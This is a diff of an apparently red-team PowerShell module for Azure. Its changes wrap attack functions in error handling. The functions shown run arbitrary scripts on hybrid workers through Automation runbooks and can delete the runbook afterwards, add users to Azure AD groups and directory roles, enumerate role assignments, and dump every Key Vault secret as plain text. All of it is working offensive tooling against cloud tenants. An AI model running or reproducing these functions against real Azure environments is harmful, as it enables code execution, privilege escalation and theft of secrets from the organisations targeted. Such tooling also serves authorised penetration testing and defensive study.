+        (Get-AzureADMSRoleDefinition -Filter "displayName eq '$RoleName'").RolePermissions | select -Expand AllowedResourceActions | Format-List
+    }
+    catch {
+        Write-Host "[!] Function failed!"
+        Throw
+        Return
+    }
 }
 
 Function Get-ARTRolePermissions {
@@ -841,46 +904,53 @@ Function Get-ARTRolePermissions {
     )
 
     try {
-        $role = Get-AzRoleDefinition -Name $RoleName
+        try {
+            $role = Get-AzRoleDefinition -Name $RoleName
+        }
+        catch {
+            Write-Host "[!] Could not get Role Definition. Possibly due to lacking privileges or lack of connection."
+            Throw
+            Return
+        }
+
+        Write-Host "Role Name:     $RoleName"
+        Write-Host "Is Custom Rol: $($role.IsCustom)"
+
+        if($role.Actions.Length -gt 0 ) {
+            Write-Host "`nActions:"
+            $role.Actions | % {
+                Write-Host "`t- $($_)"
+            }
+        }
+
+        if($role.NotActions.Length -gt 0 ) {
+            Write-Host "`nNotActions:"
+            $role.NotActions | % {
+                Write-Host "`t- $($_)"
+            }
+        }
+
+        if($role.DataActions.Length -gt 0 ) {
+            Write-Host "`nDataActions:"
+            $role.DataActions | % {
+                Write-Host "`t- $($_)"
+            }
+        }
+
+        if($role.NotDataActions.Length -gt 0 ) {
+            Write-Host "`nNotDataActions:"
+            $role.NotDataActions | % {
+                Write-Host "`t- $($_)"
+            }
+        }
+
+        Write-Host ""
     }
     catch {
-        Write-Host "[!] Could not get Role Definition. Possibly due to lacking privileges or lack of connection."
+        Write-Host "[!] Function failed!"
         Throw
         Return
     }
-
-    Write-Host "Role Name:     $RoleName"
-    Write-Host "Is Custom Rol: $($role.IsCustom)"
-
-    if($role.Actions.Length -gt 0 ) {
-        Write-Host "`nActions:"
-        $role.Actions | % {
-            Write-Host "`t- $($_)"
-        }
-    }
-
-    if($role.NotActions.Length -gt 0 ) {
-        Write-Host "`nNotActions:"
-        $role.NotActions | % {
-            Write-Host "`t- $($_)"
-        }
-    }
-
-    if($role.DataActions.Length -gt 0 ) {
-        Write-Host "`nDataActions:"
-        $role.DataActions | % {
-            Write-Host "`t- $($_)"
-        }
-    }
-
-    if($role.NotDataActions.Length -gt 0 ) {
-        Write-Host "`nNotDataActions:"
-        $role.NotDataActions | % {
-            Write-Host "`t- $($_)"
-        }
-    }
-
-    Write-Host ""
 }
 
 
@@ -943,84 +1013,91 @@ Function Invoke-ARTAutomationRunbook {
         $WorkergroupName = $null
     )
 
-    if ($ScriptPath -ne $null -and $Command -ne $null -and $ScriptPath.Length -gt 0 -and $Command.Length -gt 0) {
-        Write-Error "-ScriptPath and -Command are mutually exclusive. Pick one to continue."
-        Return
-    }
-
-    if (($ScriptPath -eq $null -and $Command -eq $null) -or ($ScriptPath.Length -eq 0 -and $Command.Length -eq 0)) {
-        Write-Error "Missing one of the required parameters: -ScriptPath or -Command"
-        Return
-    }
-
-    $createdFile = $false
-
-    if ($Command -ne $null -and $Command.Length -gt 0) {
-        $File = New-TemporaryFile
-        $ScriptPath = $File.FullName
-        Remove-Item $ScriptPath
-        $ScriptPath = $ScriptPath + ".ps1"
-
-        Write-Verbose "Writing supplied commands to a temporary file..."
-        $Command | Out-File $ScriptPath
-        $createdFile = $true
-    }
-
-    $AutomationAccount = Get-AzAutomationAccount
-
-    Write-Host "`nStep 1. Get the role of a user on the Automation account"
-    $roles = (Get-AzRoleAssignment | ? { $_.Scope -like '*Microsoft.Automation*' } | ? { $_.RoleDefinitionName -match 'Contributor' -or $_.RoleDefinitionName -match 'Owner' })
-
-    if ($roles -eq $null -or $roles.Length -eq 0 ) {
-        Write-Warning "Did not find assigned Roles for the Azure Automation service. The principal may be unauthorized to import Runbooks!"
-    }
-    else {
-        $r = $roles[0].RoleDefinitionName
-        Write-Host "[+] Principal has $r rights over Azure Automation."
-    }
-
-    if($PsCmdlet.ParameterSetName -eq "Auto") {
-        # /subscriptions/<SUBSCRIPTION-ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT-NAME>
-        $parts = $roles[0].Scope.Split('/')
-
-        if($AutomationAccountName -eq $null -or $AutomationAccountName.Length -eq 0) {
-            $AutomationAccountName = $parts[8]
+    try {
+        if ($ScriptPath -ne $null -and $Command -ne $null -and $ScriptPath.Length -gt 0 -and $Command.Length -gt 0) {
+            Write-Error "-ScriptPath and -Command are mutually exclusive. Pick one to continue."
+            Return
         }
 
-        if($AutomationAccountName -eq $null -or $ResourceGroupName.Length -eq 0) {
-            $ResourceGroupName = $parts[4]
+        if (($ScriptPath -eq $null -and $Command -eq $null) -or ($ScriptPath.Length -eq 0 -and $Command.Length -eq 0)) {
+            Write-Error "Missing one of the required parameters: -ScriptPath or -Command"
+            Return
         }
+
+        $createdFile = $false
+
+        if ($Command -ne $null -and $Command.Length -gt 0) {
+            $File = New-TemporaryFile
+            $ScriptPath = $File.FullName
+            Remove-Item $ScriptPath
+            $ScriptPath = $ScriptPath + ".ps1"
+
+            Write-Verbose "Writing supplied commands to a temporary file..."
+            $Command | Out-File $ScriptPath
+            $createdFile = $true
+        }
+
+        $AutomationAccount = Get-AzAutomationAccount
+
+        Write-Host "`nStep 1. Get the role of a user on the Automation account"
+        $roles = (Get-AzRoleAssignment | ? { $_.Scope -like '*Microsoft.Automation*' } | ? { $_.RoleDefinitionName -match 'Contributor' -or $_.RoleDefinitionName -match 'Owner' })
+
+        if ($roles -eq $null -or $roles.Length -eq 0 ) {
+            Write-Warning "Did not find assigned Roles for the Azure Automation service. The principal may be unauthorized to import Runbooks!"
+        }
+        else {
+            $r = $roles[0].RoleDefinitionName
+            Write-Host "[+] Principal has $r rights over Azure Automation."
+        }
+
+        if($PsCmdlet.ParameterSetName -eq "Auto") {
+            # /subscriptions/<SUBSCRIPTION-ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT-NAME>
+            $parts = $roles[0].Scope.Split('/')
+
+            if($AutomationAccountName -eq $null -or $AutomationAccountName.Length -eq 0) {
+                $AutomationAccountName = $parts[8]
+            }
+
+            if($AutomationAccountName -eq $null -or $ResourceGroupName.Length -eq 0) {
+                $ResourceGroupName = $parts[4]
+            }
+        }
+        
+        Write-Verbose "[.] Will target resource group: $ResourceGroupName and automation account: $AutomationAccountName"
+
+        Write-Host "`nStep 2. List hybrid workers"
+        $workergroup = Get-AzAutomationHybridWorkerGroup -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
+        $Workergroup
+
+        if($WorkergroupName -eq $null -or $WorkergroupName.Length -eq 0) {
+            $WorkergroupName = $workergroup.Name
+        }
+
+        Write-Host "`nStep 3. Create a Powershell Runbook`n"
+        Import-AzAutomationRunbook -Name $RunbookName -Path $ScriptPath -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Type PowerShell -Force -Verbose
+
+        Write-Host "`nStep 4. Publish the Runbook`n"
+        Publish-AzAutomationRunbook -RunbookName $RunbookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Verbose
+
+        Write-Host "`nStep 5. Start the Runbook`n"
+        Start-AzAutomationRunbook -RunbookName $RunbookName -RunOn $WorkergroupName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Verbose
+
+        if($RemoveAfter) {
+            Write-Host "`nStep 6. Removing the Runbook.`n"
+            Remove-AzAutomationRunbook -AutomationAccountName $AutomationAccountName -Name $RunbookName -ResourceGroupName $ResourceGroupName -Force
+        }
+
+        if($createdFile) {
+            Remove-Item $ScriptPath
+        }
+
+        Write-Host "Attack finished."
     }
-    
-    Write-Verbose "[.] Will target resource group: $ResourceGroupName and automation account: $AutomationAccountName"
-
-    Write-Host "`nStep 2. List hybrid workers"
-    $workergroup = Get-AzAutomationHybridWorkerGroup -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
-    $Workergroup
-
-    if($WorkergroupName -eq $null -or $WorkergroupName.Length -eq 0) {
-        $WorkergroupName = $workergroup.Name
+    catch {
+        Write-Host "[!] Function failed!"
+        Throw
+        Return
     }
-
-    Write-Host "`nStep 3. Create a Powershell Runbook`n"
-    Import-AzAutomationRunbook -Name $RunbookName -Path $ScriptPath -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Type PowerShell -Force -Verbose
-
-    Write-Host "`nStep 4. Publish the Runbook`n"
-    Publish-AzAutomationRunbook -RunbookName $RunbookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Verbose
-
-    Write-Host "`nStep 5. Start the Runbook`n"
-    Start-AzAutomationRunbook -RunbookName $RunbookName -RunOn $WorkergroupName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Verbose
-
-    if($RemoveAfter) {
-        Write-Host "`nStep 6. Removing the Runbook.`n"
-        Remove-AzAutomationRunbook -AutomationAccountName $AutomationAccountName -Name $RunbookName -ResourceGroupName $ResourceGroupName -Force
-    }
-
-    if($createdFile) {
-        Remove-Item $ScriptPath
-    }
-
-    Write-Host "Attack finished."
 }
 
 
@@ -1050,23 +1127,30 @@ Function Add-ARTUserToGroup {
         $GroupName
     )
 
-    $User = Get-AzureADUser | ? { $_.ObjectId -eq $Account -or $_.DisplayName -eq $Account -or $_.UserPrincipalName -eq $Account }
+    try {
+        $User = Get-AzureADUser | ? { $_.ObjectId -eq $Account -or $_.DisplayName -eq $Account -or $_.UserPrincipalName -eq $Account }
 
-    if ($User -eq $null -or $User.ObjectId -eq $null) {
-        Write-Error "Could not find target user with Account: $Account"
+        if ($User -eq $null -or $User.ObjectId -eq $null) {
+            Write-Error "Could not find target user with Account: $Account"
+            Return
+        }
+
+        $Group = Get-AzureADGroup | ? { $_.ObjectId -eq $GroupName -or $_.DisplayName -eq $GroupName}
+
+        if ($Group -eq $null -or $Group.ObjectId -eq $null) {
+            Write-Error "Could not find target group with name: $GroupName"
+            Return
+        }
+
+        Add-AzureADGroupMember -ObjectId $Group.ObjectId -RefObjectId $User.ObjectId
+
+        Write-Host "[+] Added user $($User.DisplayName) to Azure AD Group $($Group.DisplayName) ($($Group.ObjectId))"
+    }
+    catch {
+        Write-Host "[!] Function failed!"
+        Throw
         Return
     }
-
-    $Group = Get-AzureADGroup | ? { $_.ObjectId -eq $GroupName -or $_.DisplayName -eq $GroupName}
-
-    if ($Group -eq $null -or $Group.ObjectId -eq $null) {
-        Write-Error "Could not find target group with name: $GroupName"
-        Return
-    }
-
-    Add-AzureADGroupMember -ObjectId $Group.ObjectId -RefObjectId $User.ObjectId
-
-    Write-Host "[+] Added user $($User.DisplayName) to Azure AD Group $($Group.DisplayName) ($($Group.ObjectId))"
 }
 
 Function Get-ARTAzRoleAssignment {
@@ -1078,25 +1162,32 @@ Function Get-ARTAzRoleAssignment {
         PS> Get-ARTAzRoleAssignment | Format-Table
     #>
 
-    $roles = Get-AzRoleAssignment
-    $Coll = New-Object System.Collections.ArrayList
-    $roles | % {
-        $parts = $_.Scope.Split('/')
-        $scope = $parts[6..$parts.Length] -join '/'
+    try {
+        $roles = Get-AzRoleAssignment
+        $Coll = New-Object System.Collections.ArrayList
+        $roles | % {
+            $parts = $_.Scope.Split('/')
+            $scope = $parts[6..$parts.Length] -join '/'
 
-        $obj = [PSCustomObject]@{
-            RoleDefinitionName= $_.RoleDefinitionName
-            Resource          = $scope
-            ResourceGroup     = $parts[4]
-            ObjectType        = $_.ObjectType
-            CanDelegate       = $_.CanDelegate
-            Scope             = $_.Scope
+            $obj = [PSCustomObject]@{
+                RoleDefinitionName= $_.RoleDefinitionName
+                Resource          = $scope
+                ResourceGroup     = $parts[4]
+                ObjectType        = $_.ObjectType
+                CanDelegate       = $_.CanDelegate
+                Scope             = $_.Scope
+            }
+
+            $null = $Coll.Add($obj)
         }
 
-        $null = $Coll.Add($obj)
+        $Coll
     }
-
-    $Coll
+    catch {
+        Write-Host "[!] Function failed!"
+        Throw
+        Return
+    }
 }
 
 Function Add-ARTUserToRole {
@@ -1125,23 +1216,30 @@ Function Add-ARTUserToRole {
         $RoleName
     )
 
-    $User = Get-AzureADUser | ? { $_.ObjectId -eq $Account -or $_.DisplayName -eq $Account -or $_.UserPrincipalName -eq $Account }
+    try {
+        $User = Get-AzureADUser | ? { $_.ObjectId -eq $Account -or $_.DisplayName -eq $Account -or $_.UserPrincipalName -eq $Account }
 
-    if ($User -eq $null -or $User.ObjectId -eq $null) {
-        Write-Error "Could not find target user with Account: $Account"
+        if ($User -eq $null -or $User.ObjectId -eq $null) {
+            Write-Error "Could not find target user with Account: $Account"
+            Return
+        }
+
+        $Role = Get-AzureADDirectoryRole | ? { $_.ObjectId -eq $RoleName -or $_.DisplayName -eq $RoleName}
+
+        if ($Role -eq $null -or $Role.ObjectId -eq $null) {
+            Write-Error "Could not find target group with name: $RoleName"
+            Return
+        }
+
+        Add-AzureADDirectoryRoleMember -ObjectId $Role.ObjectId -RefObjectId $User.ObjectId
+
+        Write-Host "[+] Added user $($User.DisplayName) to Azure AD Role $($Role.DisplayName) ($($Role.ObjectId))"
+    }
+    catch {
+        Write-Host "[!] Function failed!"
+        Throw
         Return
     }
-
-    $Role = Get-AzureADDirectoryRole | ? { $_.ObjectId -eq $RoleName -or $_.DisplayName -eq $RoleName}
-
-    if ($Role -eq $null -or $Role.ObjectId -eq $null) {
-        Write-Error "Could not find target group with name: $RoleName"
-        Return
-    }
-
-    Add-AzureADDirectoryRoleMember -ObjectId $Role.ObjectId -RefObjectId $User.ObjectId
-
-    Write-Host "[+] Added user $($User.DisplayName) to Azure AD Role $($Role.DisplayName) ($($Role.ObjectId))"
 }
 
 
@@ -1156,28 +1254,35 @@ Function Get-ARTKeyVaultSecrets {
         PS> Get-ARTKeyVaultSecrets
     #>
     
-    $Coll = New-Object System.Collections.ArrayList
-    
-    Get-AzKeyVault | % {
-        $VaultName = $_.VaultName
+    try {
+        $Coll = New-Object System.Collections.ArrayList
+        
+        Get-AzKeyVault | % {
+            $VaultName = $_.VaultName
 
-        Get-AzKeyVaultSecret -VaultName $VaultName | % {
-            $SecretName = $_.Name
+            Get-AzKeyVaultSecret -VaultName $VaultName | % {
+                $SecretName = $_.Name
 
-            $value = Get-AzKeyVaultSecret -VaultName $VaultName -Name $SecretName -AsPlainText
+                $value = Get-AzKeyVaultSecret -VaultName $VaultName -Name $SecretName -AsPlainText
 
-            $obj = [PSCustomObject]@{
-                VaultName = $VaultName
-                Name      = $SecretName
-                Value     = $value
-                Created   = $_.Created
-                Updated   = $_.Updated
-                Enabled   = $_.Enabled
+                $obj = [PSCustomObject]@{
+                    VaultName = $VaultName
+                    Name      = $SecretName
+                    Value     = $value
+                    Created   = $_.Created
+                    Updated   = $_.Updated
+                    Enabled   = $_.Enabled
+                }
+
+                $null = $Coll.Add($obj)
             }
-
-            $null = $Coll.Add($obj)
         }
-    }
 
-    $Coll
+        $Coll
+    }
+    catch {
+        Write-Host "[!] Function failed!"
+        Throw
+        Return
+    }
 }
